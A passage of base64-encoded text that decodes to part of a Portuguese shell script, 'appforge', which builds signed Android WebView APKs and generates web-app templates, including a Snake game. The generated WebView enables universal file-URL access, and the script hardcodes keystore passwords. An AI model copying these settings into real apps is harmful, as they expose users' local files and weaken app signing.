9uPlxuPC9tYW5pZmVzdD5cbicpCm9wZW4oYnVpbGQrJy9BbmRyb2lkTWFuaWZlc3QueG1sJywndycpLndyaXRlKHhtbCkKIgogIGxvY2FsIEpBVkFfRlMgSkFWQV9USEVNRSBKQVZBX0xPQUQKICBbICIkRlVMTFNDUkVFTiIgLWVxIDEgXSBcCiAgICAmJiBKQVZBX0ZTPScgICAgICAgIHJlcXVlc3RXaW5kb3dGZWF0dXJlKGFuZHJvaWQudmlldy5XaW5kb3cuRkVBVFVSRV9OT19USVRMRSk7IGdldFdpbmRvdygpLnNldEZsYWdzKGFuZHJvaWQudmlldy5XaW5kb3dNYW5hZ2VyLkxheW91dFBhcmFtcy5GTEFHX0ZVTExTQ1JFRU4sIGFuZHJvaWQudmlldy5XaW5kb3dNYW5hZ2VyLkxheW91dFBhcmFtcy5GTEFHX0ZVTExTQ1JFRU4pOycgXAogICAgfHwgSkFWQV9GUz0nICAgICAgICAvLyBzdGF0dXMgYmFyIG5vcm1hbCcKICBjYXNlICIkVEhFTUUiIGluIGRhcmspIEpBVkFfVEhFTUU9JyAgICAgICAgdy5zZXRCYWNrZ3JvdW5kQ29sb3IoMHhGRjAwMDAwMCk7Jzs7IHRyYW5zcGFyZW50KSBKQVZBX1RIRU1FPScgICAgICAgIHcuc2V0QmFja2dyb3VuZENvbG9yKDB4MDAwMDAwMDApOyc7OyAqKSBKQVZBX1RIRU1FPScgICAgICAgIC8vIGZ1bmRvIHBhZHJhbyc7OyBlc2FjCiAgaWYgWyAtbiAiJExPQURfVVJMIiBdOyB0aGVuIEpBVkFfTE9BRD0iJExPQURfVVJMIgogIGVsaWYgWyAtbiAiJHtKQVZBX0xPQURfRkFMTEJBQ0s6LX0iIF07IHRoZW4gSkFWQV9MT0FEPSIkSkFWQV9MT0FEX0ZBTExCQUNLIgogIGVsc2UgSkFWQV9MT0FEPSdmaWxlOi8vL2FuZHJvaWRfYXNzZXQvd3d3L2luZGV4Lmh0bWwnOyBmaQogIGNhdCA+ICIkQlVJTEQvc3JjLyRQS0dfUEFUSC9XZWJBY3Rpdml0eS5qYXZhIiA8PCBKQVZBRU9GCnBhY2thZ2UgJFBLR19OQU1FOwppbXBvcnQgYW5kcm9pZC5hcHAuQWN0aXZpdHk7CmltcG9ydCBhbmRyb2lkLm9zLkJ1bmRsZTsKaW1wb3J0IGFuZHJvaWQud2Via2l0LldlYlNldHRpbmdzOwppbXBvcnQgYW5kcm9pZC53ZWJraXQuV2ViVmlldzsKaW1wb3J0IGFuZHJvaWQud2Via2l0LldlYlZpZXdDbGllbnQ7CnB1YmxpYyBjbGFzcyBXZWJBY3Rpdml0eSBleHRlbmRzIEFjdGl2aXR5IHsKICAgIHByaXZhdGUgV2ViVmlldyB3OwogICAgQE92ZXJyaWRlIHB1YmxpYyB2b2lkIG9uQ3JlYXRlKEJ1bmRsZSBiKSB7CiAgICAgICAgc3VwZXIub25DcmVhdGUoYik7CiRKQVZBX0ZTCiAgICAgICAgdyA9IG5ldyBXZWJWaWV3KHRoaXMpOwokSkFWQV9USEVNRQogICAgICAgIHNldENvbnRlbnRWaWV3KHcpOwogICAgICAgIFdlYlNldHRpbmdzIHMgPSB3LmdldFNldHRpbmdzKCk7CiAgICAgICAgcy5zZXRKYXZhU2NyaXB0RW5hYmxlZCh0cnVlKTsgcy5zZXREb21TdG9yYWdlRW5hYmxlZCh0cnVlKTsKICAgICAgICBzLnNldEFsbG93RmlsZUFjY2Vzc0Zyb21GaWxlVVJMcyh0cnVlKTsgcy5zZXRBbGxvd1VuaXZlcnNhbEFjY2Vzc0Zyb21GaWxlVVJMcyh0cnVlKTsKICAgICAgICBzLnNldEJ1aWx0SW5ab29tQ29udHJvbHMoZmFsc2UpOyBzLnNldERpc3BsYXlab29tQ29udHJvbHMoZmFsc2UpOwogICAgICAgIHMuc2V0VXNlV2lkZVZpZXdQb3J0KHRydWUpOyBzLnNldExvYWRXaXRoT3ZlcnZpZXdNb2RlKHRydWUpOwogICAgICAgIHcuc2V0V2ViVmlld0NsaWVudChuZXcgV2ViVmlld0NsaWVudCgpKTsKICAgICAgICB3LmxvYWRVcmwoIiRKQVZBX0xPQUQiKTsKICAgIH0KICAgIEBPdmVycmlkZSBwdWJsaWMgdm9pZCBvbkJhY2tQcmVzc2VkKCkgeyBpZiAody5jYW5Hb0JhY2soKSkgdy5nb0JhY2soKTsgZWxzZSBzdXBlci5vbkJhY2tQcmVzc2VkKCk7IH0KICAgIEBPdmVycmlkZSBwcm90ZWN0ZWQgdm9pZCBvblJlc3VtZSgpIHsgc3VwZXIub25SZXN1bWUoKTsgdy5vblJlc3VtZSgpOyB9CiAgICBAT3ZlcnJpZGUgcHJvdGVjdGVkIHZvaWQgb25QYXVzZSgpICB7IHN1cGVyLm9uUGF1c2UoKTsgIHcub25QYXVzZSgpOyAgfQp9CkpBVkFFT0YKICBfaW5mbyAnYWFwdDIgY29tcGlsZS4uLicKICBhYXB0MiBjb21waWxlIC0tZGlyICIkQlVJTEQvcmVzIiAtbyAiJEJVSUxEL3Jlc19jb21waWxlZC8iIDI+JjEgfCBncmVwIC12ICdeJCcgfCB3aGlsZSBJRlM9IHJlYWQgLXIgbDsgZG8gX2RpbSAiJGwiOyBkb25lCiAgX2luZm8gJ2FhcHQyIGxpbmsuLi4nCiAgYWFwdDIgbGluayAtLW1hbmlmZXN0ICIkQlVJTEQvQW5kcm9pZE1hbmlmZXN0LnhtbCIgLUkgIiRXMkFfSkFSIiAtQSAiJEJVSUxEL2Fzc2V0cyIgXAogICAgIiRCVUlMRC9yZXNfY29tcGlsZWQvIiouZmxhdCAtbyAiJEJVSUxEL3Vuc2lnbmVkLmFwayIgMj4mMSB8IGdyZXAgLXYgJ14kJyB8IHdoaWxlIElGUz0gcmVhZCAtciBsOyBkbyBfZGltICIkbCI7IGRvbmUKICBbIC1mICIkQlVJTEQvdW5zaWduZWQuYXBrIiBdIHx8IF9lcnIgJ2FhcHQyIGxpbmsgZmFsaG91JwogIF9pbmZvICdDb21waWxhbmRvIEphdmEuLi4nCiAgbG9jYWwgSkFWQV9DT01QSUxFUgogIGlmIGNvbW1hbmQgLXYgZWNqID4vZGV2L251bGwgMj4mMTsgdGhlbiBKQVZBX0NPTVBJTEVSPSdlY2onCiAgZWxpZiBjb21tYW5kIC12IGphdmFjID4vZGV2L251bGwgMj4mMTsgdGhlbiBKQVZBX0NPTVBJTEVSPSdqYXZhYycKICBlbHNlIF9lcnIgJ0NvbXBpbGFkb3IgSmF2YSBuYW8gZW5jb250cmFkby4gSW5zdGFsZTogcGtnIGluc3RhbGwgZWNqJzsgZmkKICBfZGltICJVc2FuZG86ICRKQVZBX0NPTVBJTEVSIgogIGlmIFsgIiRKQVZBX0NPTVBJTEVSIiA9ICdlY2onIF07IHRoZW4KICAgIGVjaiAtc291cmNlIDcgLXRhcmdldCA3IC1jcCAiJFcyQV9KQVIiICIkQlVJTEQvc3JjLyRQS0dfUEFUSC9XZWJBY3Rpdml0eS5qYXZhIiBcCiAgICAgIC1kICIkQlVJTEQvY2xhc3Nlcy8iIDI+JjEgfCBncmVwIC12ICdeJCcgfCB3aGlsZSBJRlM9IHJlYWQgLXIgbDsgZG8gX2RpbSAiJGwiOyBkb25lCiAgZWxzZQogICAgamF2YWMgLXNvdXJjZSA3IC10YXJnZXQgNyAtY3AgIiRXMkFfSkFSIiAiJEJVSUxEL3NyYy8kUEtHX1BBVEgvV2ViQWN0aXZpdHkuamF2YSIgXAogICAgICAtZCAiJEJVSUxEL2NsYXNzZXMvIiAyPiYxIHwgZ3JlcCAtdiAnXiQnIHwgd2hpbGUgSUZTPSByZWFkIC1yIGw7IGRvIF9kaW0gIiRsIjsgZG9uZQogIGZpCiAgWyAtZiAiJEJVSUxEL2NsYXNzZXMvJFBLR19QQVRIL1dlYkFjdGl2aXR5LmNsYXNzIiBdIHx8IF9lcnIgJ2NvbXBpbGFjYW8gSmF2YSBmYWxob3UnCiAgX2luZm8gJ2R4ICguY2xhc3MgLT4gLmRleCkuLi4nCiAgZHggLS1kZXggLS1vdXRwdXQ9IiRCVUlMRC9jbGFzc2VzLmRleCIgIiRCVUlMRC9jbGFzc2VzLyIgMj4mMSB8IGdyZXAgLXYgJ14kJyB8IHdoaWxlIElGUz0gcmVhZCAtciBsOyBkbyBfZGltICIkbCI7IGRvbmUKICBbIC1mICIkQlVJTEQvY2xhc3Nlcy5kZXgiIF0gfHwgX2VyciAnZHggZmFsaG91JwogIF9pbmZvICdFbXBhY290YW5kbyBERVguLi4nCiAgKGNkICIkQlVJTEQiICYmIHppcCAtaiB1bnNpZ25lZC5hcGsgY2xhc3Nlcy5kZXgpID4gL2Rldi9udWxsCiAgX2luZm8gJ3ppcGFsaWduLi4uJwogIHppcGFsaWduIC1mIDQgIiRCVUlMRC91bnNpZ25lZC5hcGsiICIkQlVJTEQvYWxpZ25lZC5hcGsiIDI+L2Rldi9udWxsCiAgX2Vuc3VyZV9rZXlzdG9yZQogIGxvY2FsIEtTX0FMSUFTIEtTX1BBU1MKICBpZiBbICIkVzJBX0tTIiA9ICIkSE9NRS8ueHBtL3Rvb2xzL2Fwa3Rvb2wveHBtLWNvbXBhdC10ZXN0LmtleXN0b3JlIiBdOyB0aGVuCiAgICBLU19BTElBUz0neHBtLWNvbXBhdC10ZXN0JzsgS1NfUEFTUz0neHBtLWNvbXBhdC10ZXN0JwogIGVsc2UgS1NfQUxJQVM9J2FwcGZvcmdlJzsgS1NfUEFTUz0nYXBwZm9yZ2Uta2V5JzsgZmkKICBfaW5mbyAnYXBrc2lnbmVyLi4uJwogIGFwa3NpZ25lciBzaWduIC0ta3MgIiRXMkFfS1MiIC0ta3Mta2V5LWFsaWFzICIkS1NfQUxJQVMiIFwKICAgIC0ta3MtcGFzcyBwYXNzOiIkS1NfUEFTUyIgLS1rZXktcGFzcyBwYXNzOiIkS1NfUEFTUyIgXAogICAgLS1vdXQgIiRPVVRfQVBLIiAiJEJVSUxEL2FsaWduZWQuYXBrIiAyPiYxIHwgZ3JlcCAtdiAnXiQnIHwgd2hpbGUgSUZTPSByZWFkIC1yIGw7IGRvIF9kaW0gIiRsIjsgZG9uZQogIFsgLWYgIiRPVVRfQVBLIiBdIHx8IF9lcnIgJ2Fwa3NpZ25lciBmYWxob3UnCiAgbG9jYWwgQVBLX1NJWkU7IEFQS19TSVpFPSQoZHUgLWggIiRPVVRfQVBLIiB8IGN1dCAtZjEpCiAgcHJpbnRmICdcblwwMzNbMTszMm0gID09IEFQSyBwcm9udG8gPT1cMDMzWzBtXG5cbicKICBfb2sgIkFycXVpdm8gIDogJE9VVF9BUEsgKCRBUEtfU0laRSkiCiAgX29rICJQYWNrYWdlICA6ICRQS0dfTkFNRSIKICBfb2sgIlZlcnNhbyAgIDogJFZFUlNJT05fTkFNRSAoJFZFUlNJT05fQ09ERSkiCiAgcHJpbnRmICdcbic7IF9kaW0gIkluc3RhbGFyIDogdGVybXV4LW9wZW4gJyRPVVRfQVBLJyI7IHByaW50ZiAnXG4nCn0KX2NtZF90ZW1wbGF0ZSgpIHsKICBsb2NhbCBUVFlQRT0iJHsxOi19IiBPVVRESVI9IiR7MjotfSIKICBpZiBbIC16ICIkVFRZUEUiIF07IHRoZW4KICAgIHByaW50ZiAiXG5cMDMzWzE7MzVtICBhcHBmb3JnZSB0ZW1wbGF0ZVwwMzNbMG1cblxuIgogICAgcHJpbnRmICIgIFwwMzNbMTszMm0xKVwwMzNbMG0gYmFzaWMgIDIpIHB3YSAgMykgZ2FtZSAgNCkgYmxhbmtcblxuIgogICAgcHJpbnRmICIgIFRpcG8gWzEtNCBvdSBub21lXTogIgogICAgSUZTPSByZWFkIC1yIFRUWVBFIDwvZGV2L3R0eQogICAgY2FzZSAiJFRUWVBFIiBpbiAxKSBUVFlQRT0iYmFzaWMiOzsgMikgVFRZUEU9InB3YSI7OyAzKSBUVFlQRT0iZ2FtZSI7OyA0KSBUVFlQRT0iYmxhbmsiOzsgZXNhYwogIGZpCiAgWyAteiAiJE9VVERJUiIgXSAmJiBPVVRESVI9Ii4vJHtUVFlQRX1hcHAiCiAgbWtkaXIgLXAgIiRPVVRESVIiCiAgY2FzZSAiJFRUWVBFIiBpbgogICAgYmFzaWMpIF90cGxfYmFzaWMgIiRPVVRESVIiOzsgcHdhKSBfdHBsX3B3YSAiJE9VVERJUiI7OwogICAgZ2FtZSkgX3RwbF9nYW1lICIkT1VURElSIjs7IGJsYW5rKSBfdHBsX2JsYW5rICIkT1VURElSIjs7CiAgICAqKSBwcmludGYgIlwwMzNbMTszMW0gIFRlbXBsYXRlIGRlc2NvbmhlY2lkbzogJXNcMDMzWzBtXG4iICIkVFRZUEUiOyBleGl0IDE7OwogIGVzYWMKICBwcmludGYgIlxuXDAzM1sxOzMybSAgUHJvamV0byBjcmlhZG8gZW06ICVzXDAzM1swbVxuIiAiJE9VVERJUiIKICBwcmludGYgIlwwMzNbMDs5MG0gIEJ1aWxkOiBhcHBmb3JnZSBidWlsZCAnJXMnIC0tbmFtZSBcIiVzXCJcMDMzWzBtXG5cbiIgIiRPVVRESVIiICIkVFRZUEUiCn0KX3RwbF9iYXNpYygpIHsKICBsb2NhbCBEPSIkMSIKICBjYXQgPiAiJEQvaW5kZXguaHRtbCIgPDwgJ0hUTUwnCjwhRE9DVFlQRSBodG1sPgo8aHRtbCBsYW5nPSJwdC1CUiI+CjxoZWFkPgogIDxtZXRhIGNoYXJzZXQ9IlVURi04Ij4KICA8bWV0YSBuYW1lPSJ2aWV3cG9ydCIgY29udGVudD0id2lkdGg9ZGV2aWNlLXdpZHRoLCBpbml0aWFsLXNjYWxlPTEuMCwgdXNlci1zY2FsYWJsZT1ubyI+CiAgPHRpdGxlPk1ldSBBcHA8L3RpdGxlPgogIDxsaW5rIHJlbD0ic3R5bGVzaGVldCIgaHJlZj0ic3R5bGUuY3NzIj4KPC9oZWFkPgo8Ym9keT4KICA8aGVhZGVyPjxoMT5NZXUgQXBwPC9oMT48L2hlYWRlcj4KICA8bWFpbj4KICAgIDxkaXYgY2xhc3M9ImNhcmQiPgogICAgICA8cD5UZW1wbGF0ZSBiw6FzaWNvIGRvIDxzdHJvbmc+YXBwZm9yZ2U8L3N0cm9uZz4uPC9wPgogICAgICA8cD5DbGlxdWVzOiA8c3BhbiBpZD0iY291bnQiPjA8L3NwYW4+PC9wPgogICAgICA8YnV0dG9uIGlkPSJidG4iPkNsaXF1ZSBhcXVpPC9idXR0b24+CiAgICA8L2Rpdj4KICA8L21haW4+CiAgPHNjcmlwdCBzcmM9InNjcmlwdC5qcyI+PC9zY3JpcHQ+CjwvYm9keT4KPC9odG1sPgpIVE1MCiAgY2F0ID4gIiREL3N0eWxlLmNzcyIgPDwgJ0NTUycKOnJvb3R7LS1iZzojMGYxMTE3Oy0tc3VyZmFjZTojMWExZDI3Oy0tYWNjZW50OiMxYTczZTg7LS10ZXh0OiNlOGVhZjA7LS1tdXRlZDojOGE4ZmE4fQoqe2JveC1zaXppbmc6Ym9yZGVyLWJveDttYXJnaW46MDtwYWRkaW5nOjB9CmJvZHl7YmFja2dyb3VuZDp2YXIoLS1iZyk7Y29sb3I6dmFyKC0tdGV4dCk7Zm9udC1mYW1pbHk6c3lzdGVtLXVpLHNhbnMtc2VyaWY7bWluLWhlaWdodDoxMDB2aDtkaXNwbGF5OmZsZXg7ZmxleC1kaXJlY3Rpb246Y29sdW1ufQpoZWFkZXJ7YmFja2dyb3VuZDp2YXIoLS1zdXJmYWNlKTtwYWRkaW5nOjE4cHggMjBweDt0ZXh0LWFsaWduOmNlbnRlcjtib3JkZXItYm90dG9tOjFweCBzb2xpZCAjMmEyZDNhfQpoZWFkZXIgaDF7Zm9udC1zaXplOjEuNHJlbTtjb2xvcjp2YXIoLS1hY2NlbnQpfQptYWlue2ZsZXg6MTtwYWRkaW5nOjIwcHg7bWF4LXdpZHRoOjUwMHB4O21hcmdpbjowIGF1dG87d2lkdGg6MTAwJX0KLmNhcmR7YmFja2dyb3VuZDp2YXIoLS1zdXJmYWNlKTtib3JkZXItcmFkaXVzOjE0cHg7cGFkZGluZzoyMHB4O2JvcmRlcjoxcHggc29saWQgIzJhMmQzYTttYXJnaW4tdG9wOjE2cHh9Ci5jYXJkIHB7Y29sb3I6dmFyKC0tbXV0ZWQpO2xpbmUtaGVpZ2h0OjEuNjttYXJnaW4tYm90dG9tOjEwcHh9CiNjb3VudHtjb2xvcjp2YXIoLS1hY2NlbnQpO2ZvbnQtd2VpZ2h0OmJvbGR9CmJ1dHRvbnttYXJnaW4tdG9wOjEycHg7YmFja2dyb3VuZDp2YXIoLS1hY2NlbnQpO2NvbG9yOiNmZmY7Ym9yZGVyOm5vbmU7Ym9yZGVyLXJhZGl1czoxMHB4O3BhZGRpbmc6MTJweCAyOHB4O2ZvbnQtc2l6ZToxcmVtO2N1cnNvcjpwb2ludGVyO3dpZHRoOjEwMCV9CmJ1dHRvbjphY3RpdmV7b3BhY2l0eTouNzV9CkNTUwogIGNhdCA+ICIkRC9zY3JpcHQuanMiIDw8ICdKUycKJ3VzZSBzdHJpY3QnOwpsZXQgbj0wOwpkb2N1bWVudC5nZXRFbGVtZW50QnlJZCgnYnRuJykuYWRkRXZlbnRMaXN0ZW5lcignY2xpY2snLCgpPT57CiAgZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoJ2NvdW50JykudGV4dENvbnRlbnQ9KytuOwp9KTsKSlMKfQpfdHBsX3B3YSgpIHsKICBsb2NhbCBEPSIkMSI7IF90cGxfYmFzaWMgIiREIgogIHNlZCAtaSAnc3w8L2hlYWQ+fCAgPGxpbmsgcmVsPSJtYW5pZmVzdCIgaHJlZj0ibWFuaWZlc3QuanNvbiI+XG48L2hlYWQ+fCcgIiREL2luZGV4Lmh0bWwiCiAgc2VkIC1pICdzfDwvYm9keT58ICA8c2NyaXB0PmlmKCJzZXJ2aWNlV29ya2VyImluIG5hdmlnYXRvciluYXZpZ2F0b3Iuc2VydmljZVdvcmtlci5yZWdpc3Rlcigic3cuanMiKTwvc2NyaXB0PlxuPC9ib2R5PnwnICIkRC9pbmRleC5odG1sIgogIHByaW50ZiAneyJuYW1lIjoiTWV1IFBXQSIsInNob3J0X25hbWUiOiJQV0EiLCJzdGFydF91cmwiOiIuIiwiZGlzcGxheSI6InN0YW5kYWxvbmUiLCJiYWNrZ3JvdW5kX2NvbG9yIjoiIzBmMTExNyIsInRoZW1lX2NvbG9yIjoiIzFhNzNlOCJ9XG4nID4gIiREL21hbmlmZXN0Lmpzb24iCiAgY2F0ID4gIiREL3N3LmpzIiA8PCAnU1cnCmNvbnN0IEM9J3B3YS12MScsQT1bJy8nLCcvaW5kZXguaHRtbCcsJy9zdHlsZS5jc3MnLCcvc2NyaXB0LmpzJ107CnNlbGYuYWRkRXZlbnRMaXN0ZW5lcignaW5zdGFsbCcsZT0+ZS53YWl0VW50aWwoY2FjaGVzLm9wZW4oQykudGhlbihjPT5jLmFkZEFsbChBKSkpKTsKc2VsZi5hZGRFdmVudExpc3RlbmVyKCdmZXRjaCcsZT0+ZS5yZXNwb25kV2l0aChjYWNoZXMubWF0Y2goZS5yZXF1ZXN0KS50aGVuKHI9PnJ8fGZldGNoKGUucmVxdWVzdCkpKSk7ClNXCn0KX3RwbF9nYW1lKCkgewogIGxvY2FsIEQ9IiQxIgogIGNhdCA+ICIkRC9pbmRleC5odG1sIiA8PCAnSFRNTCcKPCFET0NUWVBFIGh0bWw+CjxodG1sIGxhbmc9InB0LUJSIj4KPGhlYWQ+CiAgPG1ldGEgY2hhcnNldD0iVVRGLTgiPgogIDxtZXRhIG5hbWU9InZpZXdwb3J0IiBjb250ZW50PSJ3aWR0aD1kZXZpY2Utd2lkdGgsIGluaXRpYWwtc2NhbGU9MS4wLCB1c2VyLXNjYWxhYmxlPW5vIj4KICA8dGl0bGU+U25ha2U8L3RpdGxlPgogIDxsaW5rIHJlbD0ic3R5bGVzaGVldCIgaHJlZj0ic3R5bGUuY3NzIj4KPC9oZWFkPgo8Ym9keT4KICA8aDE+8J+QjSBTbmFrZTwvaDE+CiAgPGNhbnZhcyBpZD0iYyIgd2lkdGg9IjMwMCIgaGVpZ2h0PSIzMDAiPjwvY2FudmFzPgogIDxwIGlkPSJzY29yZSI+UG9udG9zOiAwPC9wPgogIDxkaXYgaWQ9ImRwYWQiPgogICAgPGJ1dHRvbiBkYXRhLWQ9IlVQIj7ilrI8L2J1dHRvbj4KICAgIDxkaXY+PGJ1dHRvbiBkYXRhLWQ9IkxFRlQiPuKXgDwvYnV0dG9uPjxidXR0b24gZGF0YS1kPSJSSUdIVCI+4pa2PC9idXR0b24+PC9kaXY+CiAgICA8YnV0dG9uIGRhdGEtZD0iRE9XTiI+4pa8PC9idXR0b24+CiAgPC9kaXY+CiAgPHNjcmlwdCBzcmM9InNjcmlwdC5qcyI+PC9zY3JpcHQ+CjwvYm9keT4KPC9odG1sPgpIVE1MCiAgY2F0ID4gIiREL3N0eWxlLmNzcyIgPDwgJ0NTUycKKntib3gtc2l6aW5nOmJvcmRlci1ib3g7bWFyZ2luOjA7cGFkZGluZzowfWJvZHl7YmFja2dyb3VuZDojMGYxMTE3O2NvbG9yOiNlOGVhZjA7Zm9udC1mYW1pbHk6c3lzdGVtLXVpLHNhbnMtc2VyaWY7ZGlzcGxheTpmbGV4O2ZsZXgtZGlyZWN0aW9uOmNvbHVtbjthbGlnbi1pdGVtczpjZW50ZXI7cGFkZGluZzoyMHB4IDEwcHg7Z2FwOjEycHg7bWluLWhlaWdodDoxMDB2aH1oMXtmb250LXNpemU6MS41cmVtO2NvbG9yOiMxYTczZTh9Y2FudmFze2JvcmRlcjoycHggc29saWQgIzFhNzNlODtib3JkZXItcmFkaXVzOjhweDt0b3VjaC1hY3Rpb246bm9uZX0jc2NvcmV7Y29sb3I6IzhhOGZhOH0jZHBhZHtkaXNwbGF5OmZsZXg7ZmxleC1kaXJlY3Rpb246Y29sdW1uO2FsaWduLWl0ZW1zOmNlbnRlcjtnYXA6NnB4fSNkcGFkIGRpdntkaXNwbGF5OmZsZXg7Z2FwOjZweH0jZHBhZCBidXR0b257YmFja2dyb3VuZDojMWExZDI3O2JvcmRlcjoxcHggc29saWQgIzJhMmQzYTtib3JkZXItcmFkaXVzOjEwcHg7Y29sb3I6I2U4ZWFmMDtmb250LXNpemU6MS40cmVtO3dpZHRoOjU2cHg7aGVpZ2h0OjU2cHg7Y3Vyc29yOnBvaW50ZXJ9I2RwYWQgYnV0dG9uOmFjdGl2ZXtiYWNrZ3JvdW5kOiMxYTczZTh9CkNTUwogIGNhdCA+ICIkRC9zY3JpcHQuanMiIDw8ICdKUycKJ3VzZSBzdHJpY3QnOwpjb25zdCBjYW52YXM9ZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoJ2MnKSxjdHg9Y2FudmFzLmdldENvbnRleHQoJzJkJyksU1o9MTUsQ09MUz0yMCxST1dTPTIwOwpsZXQgc25ha2UsZGlyLGZvb2Qsc2NvcmUscnVubmluZyxsb29wOwpmdW5jdGlvbiBpbml0KCl7c25ha2U9W3t4OjUseToxMH0se3g6NCx5OjEwfSx7eDozLHk6MTB9XTtkaXI9e3g6MSx5OjB9O2Zvb2Q9cm5kKCk7c2NvcmU9MDtydW5uaW5nPXRydWU7ZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoJ3Njb3JlJykudGV4dENvbnRlbnQ9J1BvbnRvczogMCc7Y2xlYXJJbnRlcnZhbChsb29wKTtsb29wPXNldEludGVydmFsKHRpY2ssMTMwKTt9CmZ1bmN0aW9uIHJuZCgpe3JldHVybnt4Ok1hdGguZmxvb3IoTWF0aC5yYW5kb20oKSpDT0xTKSx5Ok1hdGguZmxvb3IoTWF0aC5yYW5kb20oKSpST1dTKX07fQpmdW5jdGlvbiB0aWNrKCl7Y29uc3QgaD17eDpzbmFrZVswXS54K2Rpci54LHk6c25ha2VbMF0ueStkaXIueX07aWYoaC54PDB8fGgueD49Q09MU3x8aC55PDB8fGgueT49Uk9XU3x8c25ha2Uuc29tZShzPT5zLng9PT1oLngmJnMueT09PWgueSkpe2NsZWFySW50ZXJ2YWwobG9vcCk7cnVubmluZz1mYWxzZTtjdHguZmlsbFN0eWxlPSdyZ2JhKDAsMCwwLC42KSc7Y3R4LmZpbGxSZWN0KDAsMCwzMDAsMzAwKTtjdHguZmlsbFN0eWxlPScjZmZmJztjdHguZm9udD0nYm9sZCAyNHB4IHN5c3RlbS11aSc7Y3R4LnRleHRBbGlnbj0nY2VudGVyJztjdHguZmlsbFRleHQoJ0dhbWUgT3ZlcicsMTUwLDEzNSk7Y3R4LmZvbnQ9JzE2cHggc3lzdGVtLXVpJztjdHguZmlsbFRleHQoJ1RvcXVlIHBhcmEgcmVpbmljaWFyJywxNTAsMTY1KTtyZXR1cm47fXNuYWtlLnVuc2hpZnQoaCk7aWYoaC54PT09Zm9vZC54JiZoLnk9PT1mb29kLnkpe3Njb3JlKys7ZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoJ3Njb3JlJykudGV4dENvbnRlbnQ9J1BvbnRvczogJytzY29yZTtmb29kPXJuZCgpO31lbHNlIHNuYWtlLnBvcCgpO2RyYXcoKTt9CmZ1bmN0aW9uIGRyYXcoKXtjdHguZmlsbFN0eWxlPScjMGYxMTE3JztjdHguZmlsbFJlY3QoMCwwLDMwMCwzMDApO2N0eC5maWxsU3R5bGU9JyMxYTczZTgnO3NuYWtlLmZvckVhY2goKHMsaSk9PntjdHguZ2xvYmFsQWxwaGE9aT09PTA/MTowLjc7cnIocy54KlNaKzEscy55KlNaKzEsU1otMixTWi0yLDMpO30pO2N0eC5nbG9iYWxBbHBoYT0xO2N0eC5maWxsU3R5bGU9JyNlNTM5MzUnO3JyKGZvb2QueCpTWisxLGZvb2QueSpTWisxLFNaLTIsU1otMiwzKTt9CmZ1bmN0aW9uIHJyKHgseSx3LGgscil7Y3R4LmJlZ2luUGF0aCgpO2N0eC5yb3VuZFJlY3QoeCx5LHcsaCxyKTtjdHguZmlsbCgpO30KZG9jdW1lbnQuYWRkRXZlbnRMaXN0ZW5lcigna2V5ZG93bicsZT0+e2NvbnN0IG09e0Fycm93VXA6e3g6MCx5Oi0xfSxBcnJvd0Rvd246e3g6MCx5OjF9LEFycm93TGVmdDp7eDotMSx5OjB9LEFycm93UmlnaHQ6e3g6MSx5OjB9fTtpZihtW2Uua2V5XSYmIShtW2Uua2V5XS54PT09LWRpci54JiZtW2Uua2V5XS55PT09LWRpci55KSlkaXI9bVtlLmtleV07fSk7CmRvY3VtZW50LnF1ZXJ5U2VsZWN0b3JBbGwoJyNkcGFkIGJ1dHRvbicpLmZvckVhY2goYj0+e2IuYWRkRXZlbnRMaXN0ZW5lcigndG91Y2hzdGFydCcsZT0+e2UucHJldmVudERlZmF1bHQoKTtpZighcnVubmluZyl7aW5pdCgpO3JldHVybjt9Y29uc3QgbT17VVA6e3g6MCx5Oi0xfSxET1dOOnt4OjAseToxfSxMRUZUOnt4Oi0xLHk6MH0sUklHSFQ6e3g6MSx5OjB9fTtjb25zdCBkPW1bYi5kYXRhc2V0LmRdO2lmKGQmJiEoZC54PT09LWRpci54JiZkLnk9PT0tZGlyLnkpKWRpcj1kO30pO30pOwpjYW52YXMuYWRkRXZlbnRMaXN0ZW5lcignY2xpY2snLCgpPT57aWYoIXJ1bm5pbmcpaW5pdCgpO30pOwppbml0KCk7CkpTCn0KX3RwbF9ibGFuaygpIHsKICBsb2NhbCBEPSIkMSIKICBjYXQgPiAiJEQvaW5kZXguaHRtbCIgPDwgJ0hUTUwnCjwhRE9DVFlQRSBodG1sPgo8aHRtbCBsYW5nPSJwdC1CUiI+CjxoZWFkPgogIDxtZXRhIGNoYXJzZXQ9IlVURi04Ij4KICA8bWV0YSBuYW1lPSJ2aWV3cG9ydCIgY29udGVudD0id2lkdGg9ZGV2aWNlLXdpZHRoLCBpbml0aWFsLXNjYWxlPTEuMCwgdXNlci1zY2FsYWJsZT1ubyI+CiAgPHRpdGxlPk1ldSBBcHA8L3RpdGxlPgogIDxsaW5rIHJlbD0ic3R5bGVzaGVldCIgaHJlZj0ic3R5bGUuY3NzIj4KPC9oZWFkPgo8Ym9keT4KICA8c2NyaXB0IHNyYz0ic2NyaXB0LmpzIj48L3NjcmlwdD4KPC9ib2R5Pgo8L2h0bWw+CkhUTUwKICBwcmludGYgJyp7Ym94LXNpemluZzpib3JkZXItYm94O21hcmdpbjowO3BhZGRpbmc6MH1cbmJvZHl7Zm9udC1mYW1pbHk6c3lzdGVtLXVpLHNhbnMtc2VyaWY7YmFja2dyb3VuZDojZmZmO2NvbG9yOiMxMTE7bWluLWhlaWdodDoxMDB2aH1cbicgPiAiJEQvc3R5bGUuY3NzIgogIHByaW50ZiAnInVzZSBzdHJpY3QiO1xuLy8gU2V1IGPDs2RpZ28gYXF1aVxuJyA+ICIkRC9zY3JpcHQuanMiCn0KX2NtZF9tYW4oKSB7CiAgcHJpbnRmICdcblwwMzNbMTszNW0gIGFwcGZvcmdlIOKAlCBNYW51YWwgcsOhcGlkb1wwMzNbMG1cblxuJwogIHByaW50ZiAnICBpbmRleC5odG1sIERFVkUgdGVyOiA8IURPQ1RZUEUgaHRtbD4sIDxtZXRhIGNoYXJzZXQ+LCA8bWV0YSB2aWV3cG9ydD5cbicKICBwcmludGYgJyAgPHNjcmlwdD4gU0VNUFJFIGFudGVzIGRlIDwvYm9keT4uIENhbWluaG9zIFNFTVBSRSByZWxhdGl2b3MuXG5cbicKfQpfY21kX2FwazJ3ZWIoKSB7CiAgbG9jYWwgQVBLX0ZJTEU9JycgT1VUX0RJUj0nJyBGT1JDRT0wCiAgd2hpbGUgW